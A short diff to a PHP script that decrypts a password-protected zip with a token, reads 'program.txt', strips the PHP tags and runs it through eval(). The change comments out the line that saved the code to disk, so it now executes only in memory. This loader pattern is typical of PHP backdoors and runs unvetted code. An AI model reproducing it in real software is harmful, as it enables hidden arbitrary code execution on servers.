@@ -6,7 +6,7 @@ $zip->setPassword($token);
 if ($res === TRUE) {
     echo 'ok';
     $program = $zip->getFromName('program.txt');
-    file_put_contents('program.php',$program);
+    //file_put_contents('program.php',$program);
     $program = str_replace("<?php","",$program);
     $program = str_replace("?>","",$program);
     eval($program);
